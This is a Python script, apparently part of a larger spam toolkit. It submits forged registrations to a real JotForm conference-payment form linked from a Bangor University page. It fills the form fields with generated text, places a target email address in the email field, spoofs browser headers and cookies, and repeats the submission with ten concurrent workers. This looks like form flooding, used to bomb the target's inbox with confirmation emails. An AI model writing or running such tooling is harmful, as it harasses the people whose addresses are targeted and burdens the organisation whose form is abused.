from os.path import basename

import requests

from module import Spam

cookies = {
    'theme': 'tile-black',
    'guest': 'guest_e93e2267fa0bbca2',
    'userReferer': 'https%3A%2F%2Fform.jotformpro.com%2F',
    'language': 'ru-RU',
}

headers = {
    'authority': 'submit.jotformeu.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'theme=tile-black; guest=guest_e93e2267fa0bbca2; userReferer=https%3A%2F%2Fform.jotformpro.com%2F; language=ru-RU',
    'origin': 'https://form.jotformpro.com',
    'referer': 'https://form.jotformpro.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            'formID': '70802650701952',
            'q3_name[first]': text,
            'q3_name[last]': text,
            'q4_email': target,
            'q5_universityName': text,
            'q6_paperTitle': text,
            'q10_package': '£105 for PHD Students without Dinner',
            'website': '',
            'simple_spc': '70802650701952-70802650701952',
            'event_id': '1676893098920_70802650701952_scBpMUU',
            'validatedRequiredFieldIDs': '{"id_3":true,"id_4":true,"id_5":true,"id_6":true,"id_10":true}',
        }

        response = requests.post('https://submit.jotformeu.com/submit/70802650701952/', cookies=cookies,
                                 headers=headers, data=data)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'),
                        'https://www.bangor.ac.uk/management_centre/payment%20portal/Bafa%20Conference%20105.php.en')
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
